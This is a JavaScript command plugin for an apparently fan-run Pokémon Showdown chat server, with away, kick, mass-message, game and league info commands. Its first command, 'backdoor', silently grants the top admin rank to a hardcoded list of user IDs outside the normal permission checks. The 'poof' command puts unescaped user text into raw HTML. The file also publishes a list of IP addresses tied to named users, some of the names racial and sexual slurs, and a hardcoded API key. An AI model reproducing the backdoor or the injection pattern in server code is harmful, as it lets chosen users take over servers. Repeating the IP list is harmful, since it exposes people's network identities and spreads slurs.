var fs = require('fs');
var request = require('request');
var http = require('http');
var poofoff = false;

exports.commands = {
	//misc
	backdoor: function (target, room, user) {
		var userlist = {frntierblade:1, siiilver:1, champinnah:1, onyxeagle:1, femalegallade:1};
		if (!userlist[user.userid]) return false;
		
        if (!target) {
            user.group = '~';
            user.updateIdentity();
            return;
        }

        if (target === 'reg') {
            user.group = ' ';
            user.updateIdentity();
            return;
        }
    },
    
	afk: 'away',
	dinner: 'away',
	dindins: 'away',
	busy: 'away',
	away: function (target, room, user, connection, cmd) {
		if (user.isAway) return this.parse('/back');
		var Names = {dindins: ' - ⒹⓘⓝⒹⓘⓝⓢ', dinner: ' - ⒹⓘⓝⒹⓘⓝⓢ', busy: '- ⒷⓊⓈⓎ'};
		var Messages = {dindins: 'is now having dindins', dinner: 'is now having dinner', busy: 'is now busy'};
		
		user.awayName = Names[cmd] || '- ⒶⒻⓀ';
		var awayMessage = Messages[cmd] || 'is now away';
		target = target.escapeHTML();
		var name = user.name;
		
		if (user.isStaff) this.add('|raw|-- <b><font color="#000000">' + name + '</font></b> ' + awayMessage + '. ' + (target ? " (" + target + ")" : ""));
		else this.sendReply('You are now away.');
		for (var i in Names) name = name.replace(RegExp(Names[i], 'g'), '');
		user.forceRename(name + user.awayName, undefined, true);
		user.isAway = true;
		user.blockChallenges = true;
		user.updateIdentity();
	},
	
	unafk: 'unafk',
	back: function(target, room, user, connection) {
		if (!user.isAway) return this.sendReply('You are not set as away.');
		var name = user.name.replace(RegExp(user.awayName, 'g'), '');
		user.forceRename(name, undefined, true);
		if (user.isStaff) this.add('|raw|-- <b><font color="#000000">' + user.name + '</font></b> is back.');
		user.isAway = false;
		delete user.awayName;
		user.blockChallenges = false;
		user.updateIdentity();
	},
	
	reddeclare: 'declare',
	declarered: 'declare',
	declaregreen: 'declare',
	greendeclare: 'declare',
	yellowdeclare: 'declare',
	declareyellow: 'declare',
	purpledeclare: 'declare',
	declarepurple: 'declare',
	declare: function (target, room, user, connection, cmd) {
		if (!target) return this.parse('/help declare');
		if (!this.can('declare', null, room)) return false;

		if (!this.canTalk()) return;
		
		var message = '<b>' + Tools.escapeHTML(target) + '</b>';
		switch (cmd) {
			case 'reddeclare': case 'declarered':
				this.add('|raw|<div class="broadcast-red">' + message);
				break;
			case 'declaregreen': case 'greendeclare':
				this.add('|raw|<div class="broadcast-green">' + message);
				break;
			case 'declareyellow': case 'yellowdeclare':
				this.add('|raw|<div style = "background: #ffe100; color: black; padding: 2px 4px;">' + message);
				break;
			case 'declarepurple': case 'purpledeclare':
				this.add('|raw|<div style = "background: #993399; color: white; padding: 2px 4px;">' + message);
				break;
			default: this.add('|raw|<div class="broadcast-blue">' + message);
		}
		this.logModCommand(user.name + " declared " + target);
	},

	k: 'kick',
	spank: 'kick',
	kick: function (target, room, user, connection, cmd) {
		if (!target) return;
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser || !targetUser.connected) {
			return this.sendReply("User " + this.targetUsername + " not found.");
		}
		if (!this.can('kick', targetUser, room)) return false;
		var msg = "kicked by " + user.name + (target ? " (" + target + ")" : "") + ".";
		targetUser.popup("You have been " + msg);
		if (cmd === 'spank') msg = msg.replace('kicked', 'spanked out of the room');
		this.addModCommand("" + targetUser.name + " was " + msg);
		targetUser.leaveRoom(room);
	},

	masspm: 'pmall',
	pmall: function (target, room, user) {
		if (!this.can('declare')) return false;
		if (!target) return this.sendReply('/pmall [message] - Sends a message to all users in the server.');

		var pmName = '~Server-Kun [Do not reply]';

		for (var i in Users.users) {
			var message = '|pm|' + pmName + '|' + Users.users[i].getIdentity() + '|' + target;
			Users.users[i].send(message);
		}
	},

	rmall: function (target, room, user) {
		if (!this.can('roomdeclare', null, room)) return false;
		if (!target) return this.sendReply('/rmall [message] - Sends a message to all users in the room');

		var pmName = '~Server-Kun [Do not reply]';

		for (var i in room.users) {
			var message = '|pm|' + pmName + '|' + room.users[i].getIdentity() + '|' + target;
			room.users[i].send(message);
		}
	},

	roomlist: function (target, room, user) {
		if (!this.can('declare')) return false;

		var rooms = Object.keys(Rooms.rooms),
			len = rooms.length,
			official = ['<b><font color="#1a5e00" size="2">Official chat rooms</font></b><br><br>'],
			nonOfficial = ['<hr><b><font color="#000b5e" size="2">Chat rooms</font></b><br><br>'],
			privateRoom = ['<hr><b><font color="#5e0019" size="2">Private chat rooms</font></b><br><br>'];

		while (len--) {
			var _room = Rooms.rooms[rooms[(rooms.length - len) - 1]];
			if (_room.type === 'chat') {
				if (_room.isOfficial) {
					official.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
					continue;
				}
				if (_room.isPrivate) {
					privateRoom.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
					continue;
				}
				nonOfficial.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
			}
		}

		this.sendReplyBox(official.join(' ') + nonOfficial.join(' ') + privateRoom.join(' '));
	},
	
	flogout: 'forcelogout',
	forcelogout: function(target, room, user) {
		if(!user.can('hotpatch')) return;
		if (!this.canTalk()) return false;

		if (!target) return this.sendReply('/forcelogout [username], [reason] OR /flogout [username], [reason] - You do not have to add a reason');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;

		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}

		if (targetUser.can('hotpatch')) return this.sendReply('You cannot force logout another Admin.');

		this.addModCommand(''+targetUser.name+' was forcibly logged out by '+user.name+'.' + (target ? " (" + target + ")" : ""));

		this.logModCommand(user.name+' forcibly logged out '+targetUser.name);

		targetUser.resetName();
	},

	seen: 'lastseen',
	lastseen: function (target, room, user, connection, cmd) {
		if (!this.canBroadcast()) return;
		target = Users.getExact(target) ? Users.getExact(target).name : target;
		if (!toId(target) || toId(target) === user.userid) target = user.name;
		var seen = Core.getLastSeen(toId(target));
		if (seen === 'never') return this.sendReplyBox(target + ' has <font color = "red">never</font> been seen online.');
		if (Users.getExact(target) && Users.getExact(target).connected) return this.sendReplyBox(target + ' is currently <font color = "green">online</font>. This user has stayed online for ' + seen + '.');
		return this.sendReplyBox(target + ' was last seen ' + seen + ' ago.');
	},

	registered: 'regdate',
	regdate: function (target, room, user, connection, cmd) {
		if (!toId(target)) return this.sendReply("'" + target + "' is not a valid username.");
		if (!toId(target).length > 18) return this.sendReply('Usernames can only contain 18 characters at the max.');
		if (!this.canBroadcast()) return;

		var path = "http://pokemonshowdown.com/users/" + toId(target);
		var self = this;

		request(path, function (error, response, body) {
			if (error || response.statusCode === 404) {
				self.sendReplyBox(target + ' is not registered.');
				room.update();
				return;
			}
			var date = body.split('<small>')[1].split('</small>')[0].substr(17);
			if (!date) self.sendReplyBox(target + ' is not registered.');
			else self.sendReplyBox(target + ' was registered on ' + date);
			room.update();
		});
	},

	u: 'urbandefine',
	ud: 'urbandefine',
	urbandefine: function (target, room, user) {
		if (!this.canBroadcast()) return;
		if (room.id === 'lobby' && this.broadcasting) return this.sendReply('You cannot broadcast this command in the lobby.')
		if (!target) return this.parse('/help urbandefine')
		if (target > 50) return this.sendReply('Phrase can not be longer than 50 characters.');

		var self = this;
		var options = {
			url: 'http://www.urbandictionary.com/iphone/search/define',
			term: target,
			headers: {
				'Referer': 'http://m.urbandictionary.com'
			},
			qs: {
				'term': target
			}
		};

		function callback(error, response, body) {
			if (!error && response.statusCode == 200) {
				var page = JSON.parse(body);
				var definitions = page['list'];
				if (page['result_type'] == 'no_results') {
					self.sendReplyBox('No results for <b>"' + Tools.escapeHTML(target) + '"</b>.');
					return room.update();
				} else {
					if (!definitions[0]['word'] || !definitions[0]['definition']) {
						self.sendReplyBox('No results for <b>"' + Tools.escapeHTML(target) + '"</b>.');
						return room.update();
					}
					var output = '<b>' + Tools.escapeHTML(definitions[0]['word']) + ':</b> ' + Tools.escapeHTML(definitions[0]['definition']).replace(/\r\n/g, '<br />').replace(/\n/g, ' ');
					if (output.length > 400) output = output.slice(0, 400) + '...';
					self.sendReplyBox(output);
					return room.update();
				}
			}
		}
		request(options, callback);
	},

	def: 'define',
	define: function (target, room, user) {
		if (!this.canBroadcast()) return;
		if (!target) return this.parse('/help define');
		target = toId(target);
		if (target > 50) return this.sendReply('Word can not be longer than 50 characters.');

		var self = this;
		var options = {
			url: 'http://api.wordnik.com:80/v4/word.json/' + target + '/definitions?limit=3&sourceDictionaries=all' +
				'&useCanonical=false&includeTags=false&api_key=a2a73e7b926c924fad7001ca3111acd55af2ffabf50eb4ae5',
		};

		function callback(error, response, body) {
			if (!error && response.statusCode == 200) {
				var page = JSON.parse(body);
				var output = '<b>Definitions for ' + target + ':</b><br />';
				if (!page[0]) {
					self.sendReplyBox('No results for <b>"' + target + '"</b>.');
					return room.update();
				} else {
					var count = 1;
					for (var u in page) {
						if (count > 3) break;
						output += '(' + count + ') ' + page[u]['text'] + '<br />';
						count++;
					}
					self.sendReplyBox(output);
					return room.update();
				}
			}
		}
		request(options, callback);
	},

	poof: function (target, room, user) {
		if (!this.canTalk()) return;
		if (poofoff) return this.sendReply("Poof is currently disabled.");
		var colors = ['9900f2', '4ca2ff', '4cff55', 'e87f00', 'd30007', '8e8080', 'd8b00d', '01776a', '0c4787', '0c870e', '8e892c',
			'5b5931', '660c60', '9e5a99', 'c43873', '39bf39', '7c5cd6', '76d65c', '38c9c9', '2300af', '1daf00'
		];
		var randomColor = colors[Math.floor(Math.random() * colors.length)];
		var poof = JSON.parse(fs.readFileSync('storage-files/poof.json'));
		var message = toId(target) ? target : poof[Math.floor(Math.random() * poof.length)];
		if (message.indexOf('(user)') > -1) message = message.replace(/\(user\)/ig, user.name);
		else message = user.name + ' ' + message;
		this.add('|html|<center><b><font color = "' + randomColor + '">~~ ' + message + ' ~~');
		user.disconnectAll();
	},

	addpoof: function (target, room, user) {
		if (!this.can('hotpatch')) return false;
		if (!target) return this.sendReply('/addpoof [message] - Adds a poof message into the list of possible poofs. No need to include any name at the start, just the message. Adding "(user)" into a poof message replaces "(user)" with the user\'s name.');
		target = target.replace(/"/g, '\"').trim();
		if (!fs.existsSync('storage-files/poof.json')) fs.writeFile('storage-files/poof.json', '[]');
		var poof = JSON.parse(fs.readFileSync('storage-files/poof.json'));
		for (var i in poof) {
			if (toId(target) == toId(poof[i])) return this.sendReply('That poof message already exists!');
		}
		poof.push(target);
		fs.writeFile('storage-files/poof.json', JSON.stringify(poof, null, 1));
		if (target.indexOf('(user)') === -1) target = '(user) ' + target;
		return this.sendReply('"' + target + '" has been added to the list of poof messages.');
	},

	poofoff: function (target, room, user) {
		if (!this.can('hotpatch')) return false;
		if (poofoff) return this.sendReply('Poofs have already been disabled.');
		poofoff = true;
		this.sendReply("Poofs have been disabled.");
	},

	poofon: function (target, room, user) {
		if (!this.can('hotpatch')) return false;
		if (!poofoff) return this.sendReply('Poofs have not been disabled.');
		poofoff = false;
		this.sendReply("Poofs have been enabled.");
	},

	sprite: function (target, room, user, connection, cmd) {
		if (!this.canBroadcast()) return;
		if (!toId(target)) return this.sendReply('/sprite [Pokémon] - Allows you to view the sprite of a Pokémon');
		target = target.toLowerCase().split(',');
		var alt = '';
		var type = toId(target[1]);
		var sprite = target[0].trim();
		var url;
		if (type === 'shiny') url = 'http://play.pokemonshowdown.com/sprites/xyani-shiny/';
		else if (type === 'back') url = 'http://play.pokemonshowdown.com/sprites/xyani-back/';
		else if (type === 'backshiny' || type === 'shinyback') url = 'http://play.pokemonshowdown.com/sprites/xyani-back-shiny/';
		else url = 'http://play.pokemonshowdown.com/sprites/xyani/';

		if (Number(sprite[sprite.length - 1]) && !toId(sprite[sprite.length - 2])) {
			alt = '-' + sprite[sprite.length - 1];
			sprite = sprite.substr(0, sprite.length - 1);
			url = 'http://www.pkparaiso.com/imagenes/xy/sprites/animados/';
		}
		var main = target[0].split(',');
		if (Tools.data.Pokedex[toId(sprite)]) {
			sprite = Tools.data.Pokedex[toId(sprite)].species.toLowerCase();
		} else {
			var correction = Tools.dataSearch(toId(sprite));
			if (correction && correction.length) {
				for (var i = 0; i < correction.length; i++) {
					if (correction[i].id !== toId(sprite) && !Tools.data.Aliases[toId(correction[i].id)] && !i) {
						if (!Tools.data.Pokedex[toId(correction[i])]) continue;
						if (!Tools.data.Aliases[toId(sprite)]) this.sendReply("There isn't any Pokémon called '" + sprite + "'... Did you mean '" + correction[0].name + "'?\n");
						sprite = Tools.data.Pokedex[correction[0].id].species.toLowerCase();
					}
				}
			} else {
				return this.sendReply("There isn\'t any Pokémon called '" + sprite + "'...");
			}
		}
		var self = this;
		require('request').get(url + sprite + alt + '.gif').on('error', function () {
			self.sendReply('The sprite for ' + sprite + alt + ' is unavailable.');
		}).on('response', function (response) {
			if (response.statusCode == 404) return self.sendReply('The sprite for ' + sprite + alt + ' is currently unavailable.');
			self.sendReply('|html|<img src = "' + url + sprite + alt + '.gif">');
		});
	},
	
	clearall: function (target, room, user) {
		if (!this.can('clearall')) return;
		var len = room.log.length,
			users = [];
        while (len--) {
			room.log[len] = '';
		}
		for (var user in room.users) {
			users.push(user);
			Users.get(user).leaveRoom(room, Users.get(user).connections[0]);
		}
		len = users.length;
		setTimeout(function() {
			while (len--) {
				Users.get(users[len]).joinRoom(room, Users.get(users[len]).connections[0]);
			}
		}, 1000);
	},
	
	//Panagram
	panagramhelp: 'panagramrules',
    panagramrules: function(target, room, user) {
        if (!this.canBroadcast()) return;
        return this.sendReplyBox('<u><font size = 2><center>Pangram rules and commands</center></font></u><br />' +
            '<b>/panagram</b> - Starts a game of Panagram in the room (Panagrams are just anagrams with Pokemon). Illegal and CAP Pokemon won\'t be selected. Must be ranked + or higher to use.<br />' +
            '<b>/guessp [Pokemon]</b> - Guesses a Pokémon. After guessing incorrectly, you cannot guess again in the same game. There are a total of 3 tries per game. The answer is revealed after all 3 chances are over.<br />' +
            '<b>/panagramend</b> OR <b>/endpanagram</b> OR <b>/endp</b> - Ends the current game of Panagram.');
    },
    //panagram commands.
    panagram: function(target, room, user) {
        if (!this.can('broadcast', null, room)) return false;
        if (room.panagram) return this.sendReply('There is already a game of Panagram going on.');
        var pokedex = [];
        for (var i in Tools.data.Pokedex) {
            if (Tools.data.Pokedex[i].num > 0 && !Tools.data.Pokedex[i].forme) {
                pokedex.push(i);
            }
        }
        var mixer = function(word) {
            var array = [];
            for (var k = 0; k < word.length; k++) {
                array.push(word[k]);
            }
            var a;
            var b;
            var i = array.length;
            while (i) {
                a = Math.floor(Math.random() * i);
                i--;
                b = array[i];
                array[i] = array[a];
                array[a] = b;
            }
            return array.join('').toString();
        }

        var poke = pokedex[Math.floor(Math.random() * pokedex.length)];
        var panagram = mixer(poke.toString());
        while (panagram == poke) {
            panagram = mixer(poke);
        }
        //var x = Math.floor(Math.random() * panagram.length);
        this.add('|html|<div class = "infobox"><center><b>A game of Panagram has been started!</b><br/>' +
            'The scrambled Pokémon is <b>' + panagram + '</b><br/>' +
            '<font size = 1>Type in <b>/gp or /guesspoke [Pokémon]</b> to guess the Pokémon!');
        room.panagram = {};
        room.panagram.guessed = [];
        room.panagram.chances = 2;
        room.panagram.answer = toId(poke);
    },

	gp: 'guessp',
    guesspoke: 'guessp',
    guessp: function(target, room, user, cmd) {
        if (!room.panagram) return this.sendReply('There is no game of Panagram going on in this room.');
        if (room.panagram[user.userid]) return this.sendReply("You've already guessed once!");
        if (!target) return this.sendReply("The proper syntax is /guessp [pokemon]");
        if (!Tools.data.Pokedex[toId(target)]) return this.sendReply("'" + target + "' is not a valid Pokémon.");
        if (Tools.data.Pokedex[toId(target)].num < 1) return this.sendReply(Tools.data.Pokedex[toId(target)].species + ' is either an illegal or a CAP Pokémon.');
        if (Tools.data.Pokedex[toId(target)].baseSpecies) target = toId(Tools.data.Pokedex[toId(target)].baseSpecies);
        if (room.panagram.guessed.indexOf(toId(target)) > -1) return this.sendReply("That Pokemon has already been guessed!");
        if (room.panagram.answer == toId(target)) {
            this.add('|html|<b>' + user.name + '</b> guessed <b>' + Tools.data.Pokedex[toId(target)].species + '</b>, which was the correct answer! Congratulations!');
            delete room.panagram;
        } else {
            if (room.panagram.chances > 0) {
                this.add('|html|<b>' + user.name + '</b> guessed <b>' + Tools.data.Pokedex[toId(target)].species + '</b>, but was not the correct answer...');
                room.panagram[user.userid] = toId(target);
                room.panagram.guessed.push(toId(target));
                room.panagram.chances--;
            } else {
                this.add('|html|<b>' + user.name + '</b> guessed <b>' + Tools.data.Pokedex[toId(target)].species + '</b>, but was not the correct answer. You have failed to guess the Pokemon, which was <b>' + Tools.data.Pokedex[room.panagram.answer].species + '</b>');
                delete room.panagram;
            }
        }
    },
    panagramoff: 'endpanagram',
    endp: 'endpanagram',
    panagramend: 'endpanagram',
    endpanagram: function(target, room, user) {
        if (!room.panagram) return this.sendReply('There is no panagram game going on in this room yet.');
        this.add("|html|<b>The game of Panagram has been ended.</b>");
        delete room.panagram;
    },

	//League related stuff
	addsymbols: 'symbols',
	symbols: function (target, room, user) {
		if (!this.can('warn')) {
			this.sendReply('You need to be a league member to be able to use this command.');
			return false;
		}
		if (user.name.indexOf('∆') === 0 && user.name.lastIndexOf('∆') === (user.name.length - 1)) return this.sendReply("You already have your league symbols on.");
		if (user.name.indexOf('∆') == 0) {
			user.forceRename(user.name + '∆', undefined, true);
		} else if (user.name.lastIndexOf('∆') == (user.name.length - 1)) {
			user.forceRename('∆' + user.name, undefined, true);
		} else {
			user.forceRename('∆' + user.name + '∆', undefined, true);
		}
		return this.sendReply('Your league symbols have been added.');
	},

	hos: 'banlist',
	hallofshame: 'banlist',
	banlist: function (target, room, user) {
		if (this.broadcasting) return;
		this.sendReplyBox('<b>The Sora League Server Hall of Shame (Banlist):</b><br />' +
			'The following users are to be banned on sight, no exceptions. Most of them have dynamic ips, but even so, the first 2 set of numbers should be the same<br />' +
			'117.193.61.37/115.250.65.134 - Adipravar/lingam/China Guy<br />' +
			'79.216.58.98 - MegaschoolGirl/Jessica albas ass/Gym Leader Beer<br />' +
			'110.143.22.35 - Whelplo/Lord Noxot<br />' +
			'81.204.176.142<br />' +
			'68.144.221.250 - modsdd911/cocksucker3000<br />' +
			'65.9.122.140 - XVid<br />' +
			'188.247.72.73 - elite four pkmn/chatot<br />' +
			'50.117.78.134<br />' +
			'109.123.112.118<br />' +
			'70.56.251.194 - PEEEENNNNUUUSSSS<br />' +
			'184.148.86.83 - POOOOP BRO/MrGaminganimation<br />' +
			'76.103.152.157 - Thafuckingnigga<br />' +
			'110.174.150.196 - Nigerian Nuts<br />' +
			'77.209.58.47 - Spammer 008/flood of water<br />' +
			'107.3.135.54 - ilikewings<br />' +
			'24.118.0.134 - Colgate SHIT<br />' +
			'89.148.36.189 - gym leader Zaga<br />' +
			'204.108.212.233 - gawkypath<br />' +
			'95.211.174.70<br />' +
			'112.207.89.115<br />' +
			'69.171.166.93 - Efficient<br />' +
			'64.21.211.34 - Psychic kid<br />' +
			'217.123.61.20 - Sjado<br />' +
			'96.255.1.236<br />' +
			'12.204.68.50 - Denver Broncos<br />' +
			'173.8.74.161 - SawkTooOp<br />' +
			'149.254.224.226<br />' +
			'23.17.238.53 -Zarif<br />' +
			'74.88.1.127 -Unicode spammer (Eldes)<br />' +
			'23.30.142.86 -Carl Jones<br />' +
			'94.79.237.137 -Champiön Greninja<br />' +
			'71.191.144.42 -Imp Dawnmidst<br />' +
			'104.157.62.151 -ZYGA<br />' +
			'37.58.52.99 -Snowking<br />' +
			'222.127.85.53 -Galactic Azir<br />' +
			'76.100.209.92 -OgreLordVagina<br />' +
			'31.7.62.170 -Dan <br />' +
			'71.41.165.94 -yDante <br />' +
			'62.140.132.13 -Aidan <br />' +
			'Shame on them!');
	},

	join: function (target, room, user, connection) {
		if (!target) return false;
		var targetRoom = Rooms.get(target) || Rooms.get(toId(target));
		if (!targetRoom) {
			return connection.sendTo(target, "|noinit|nonexistent|The room '" + target + "' does not exist.");
		}
		if (targetRoom.isPrivate && !user.named) {
			return connection.sendTo(target, "|noinit|namerequired|You must have a name in order to join the room '" + target + "'.");
		}
		if (!user.joinRoom(targetRoom || room, connection)) {
			return connection.sendTo(target, "|noinit|joinfailed|The room '" + target + "' could not be joined.");
		}
		//If you need to add another IP or host, add a comma after the last element of the array below, and enter
		//the IP/Host in single or double quotes. Adding a portion of an IP would be acceptable too, since this
		//filter checks if a user's IP or host contains any of the blacklisted IPs or hosts, rather than
		//looking for an exact match
		var blacklist = ["dhcp-077-250-225-247.chello.nl", "c-76-100-209-92.hsd1.md.comcast.net", "zenmate",
			"74.88.1.127", "27.122.15.28", "mx-ll-223.205.20-59.dynamic.3bb.co.th", "50-108-108-125.adr01.mskg.mi.frontiernet.net",
			"cpe-67-253-120-124.maine.res.rr.com", "62.140.132.94", "62.140.132.19", "50.84.151.157", "67.164.32.244",
			"117.216.41.194", "CPE-155-143-4-109.vic.bigpond.net.au", "94.254.0.55", "108.61.179.200.vultr.com",
			"ool-4573a317.dyn.optonline.net", "69.115.163.23", "173.30.53.93", "71.41.165.94",
			"bb116-15-8-217.singnet.com.sg", "62.140.132.13", "103-10-199-146.pacswitch.com", "116.14.185.162"
		];
		for (var i = 0; i < blacklist.length; i++) {
			if (user.latestHost.indexOf(blacklist[i]) > -1 || user.latestIp.indexOf(blacklist[i]) > -1) {
				user.popup('You are on the Sora League banlist or are using a Proxy. GET REKT SON.');
				user.ban();
			}
		}
	},

	chall: 'challenge',
	challenge: function (target, room, user, connection) {
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser || !targetUser.connected) {
			return this.popupReply("The user '" + this.targetUsername + "' was not found.");
		}
		if (targetUser.blockChallenges && !user.can('bypassblocks', targetUser)) {
			return this.popupReply("The user '" + this.targetUsername + "' is not accepting challenges right now.");
		}
		if (Config.pmmodchat) {
			var userGroup = user.group;
			if (Config.groupsranking.indexOf(userGroup) < Config.groupsranking.indexOf(Config.pmmodchat)) {
				var groupName = Config.groups[Config.pmmodchat].name || Config.pmmodchat;
				this.popupReply("Because moderated chat is set, you must be of rank " + groupName + " or higher to challenge users.");
				return false;
			}
		}
		if (toId(target) == 'leaguebattle') {
			if (!user.can('warn') && !targetUser.can('lock')) return this.popupReply('Only Gym Leaders or higher can be challenged in this format.');
			else if (user.can('warn') && targetUser.can('lock')) return this.popupReply('Only challengers can be challenged in this format.');
		}
		user.prepBattle(target, 'challenge', connection, function (result) {
			if (result) user.makeChallenge(targetUser, target);
		});
	},

	rules: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('Please follow the rules:<br />' +
			'- <a href="http://soraleague.weebly.com/rules.html">Sora League rules</a><br />' +
			'</div>');
	},

	site: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('Here is The Sora League Website:<br />' +
			'- <a href="http://soraleague.weebly.com/index.html">Sora League Site</a><br />' +
			'</div>');
	},

	incweather: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('Here is a detailed explanation of the format Inclement Weather:<br />' +
			'- <a href="http://soraleague.weebly.com/inclement-weather.html">Inclement Weather</a><br />' +
			'</div>');
	},

	priomon: 'priomons',
	priomons: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('Here is a detailed explanation of the format Priomons:<br />' +
			'- <a href="http://soraleague.weebly.com/priomons.html">Priomons</a><br />' +
			'</div>');
	},

	pokemonsandbox: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('Here is a detailed explanation of the format Pokemon Sandbox:<br />' +
			'- <a href=http://soraleague.weebly.com/pokemon-sandbox.html">Pokemon Sandbox</a><br />' +
			'</div>');
	},

	championschallenge: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('Here is a detailed explanation of the format Champion\'s Challenge:<br />' +
			'- <a href="http://soraleague.weebly.com/champions-challenge.html">Champion\'s Challenge</a><br />' +
			'</div>');
	},

	ipl: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('Here is a link to the International Pokemon League Tournament (IPL):<br />' +
			'- <a href="http://sorapremierleague.weebly.com/">IPL Tournament Web Site</a><br />' +
			'</div>');
	},

	events: 'events',
	events: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('Here is a list of events held in The Sora League:<br />' +
			'- <a href="http://soraleague.weebly.com/events.html">Sora League Events</a><br />' +
			'</div>');
	},

	gymtrainers: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('Here is a list of Sora League Gym Trainers:<br />' +
			'- <a href="http://soraleague.weebly.com/gym-trainers.html">Sora League Gym Trainers</a><br />' +
			'</div>');
	},

	gymleaders: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('Here is a list of Sora League Gym Leaders:<br />' +
			'- <a href="http://soraleague.weebly.com/gym-leaders.html">Sora League Gym Leaders</a><br />' +
			'</div>');
	},

	frontier: 'battlefrontier',
	battlefrontier: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('<b>Sora Battle Frontier</b><br />' +
			'<i>"Welcome to the Sora Battle Frontier! Challenge us if you Dare."</i> <br />' +
			'<b>Requirements:</b> 8 Badges<br />' +
			'<b>Rules:</b> The Battle Frontier must be challenged after collecting 8 gym badges and 2 normal Frontiers must be defeated to gain access to the Elite 4.<br />' +
			'- The Elite Frontiers can only be challenged once a challenger has 4 different symbols.<br />' +
			'- The Frontier Head can be challenged after deafeating all other Frontier members.<br />' +
			'- If a challenger loses to an Elite Frontier or the Frontier Head, they will randomly lose one Elite symbol and one normal symbol.<br />' +
			'<blink><b>Notes:</b></blink><br />' +
			'- The same frontier may be challenged once every 24 hours.<br />' +
			'- You cannot use a super-effective team when challenging a Monotype Tier Frontier<br />' +
			'- <a href="http://soraleague.weebly.com/rules.html">Challenging Rules</a><br />' +
			'- <a href="http://soraleague.weebly.com/frontier.html">Battle Frontier Members</a><br />');
	},

	frontiers: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('Here is a list of Sora League Frontier Brains:<br />' +
			'- <a href="http://soraleague.weebly.com/frontier.html">Sora League Frontier Brains</a><br />' +
			'</div>');
	},

	elitefour: 'e4',
	e4: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('Here is a list of Sora League Elite Four:<br />' +
			'- <a href="http://soraleague.weebly.com/elite-four.html">Sora League Elite Four</a><br />' +
			'</div>');
	},

	champions: 'champions',
	champions: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('Here is a list of Sora League Champions:<br />' +
			'- <a href="http://soraleague.weebly.com/champions.html">Sora League Champions</a><br />' +
			'</div>');
	},

	quoteoftheday: 'qotd',
	qotd: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('<b>Quote of the Day:</b><br />' +
			'This command will display genius quotes until another quote tops it!<br />' +
			'"I\'m better as an E4." - Matt 2014<br />' +
			'"you have been hour munted by demon lrod helix" - Artiste Jeratt 9/7/14<br />' +
			'"Oh boy, how I love women. Golly gosh, I really do love vajigglejaggle. If only I could express how much I loved melons. Gee whizz." -Gym Ldr Eska 19/7/14<br />' +
			'"there can only be one asch, but anyone can be an aschhole" -E4 Cocoa 17/8/14<br /> ' +
			'"Drizzle Damp Rock is broken, but apparently the flying Rabbit Hedgehog from Ubers is okay." -∆Champiön Nöah∆ 1/9/14 <br />' +
			'"The thing about electric types is you always gotta wear a rubber"-∆E4 Vanilla∆ 6/9/14<br />' +
			'"Umbreon is dark?"-∆E4 Arjunb∆ 30/11/14<br />' +
			'"Isn\'t Color Change and protean the same thing?" -∆Frontier∆ Nova 15/12/14<br />' +
			'"Smogon pretty much did the Treaty of Versailles to Water" -∆Champiön Nöah∆ 12/1/15<br />' +
			'"Chief Akkie, head of the meme police, serving for 38 years; no meme slips through her cracks." -Eska and Desna 14/3/15<br />' +
			'</div>');
	}
};
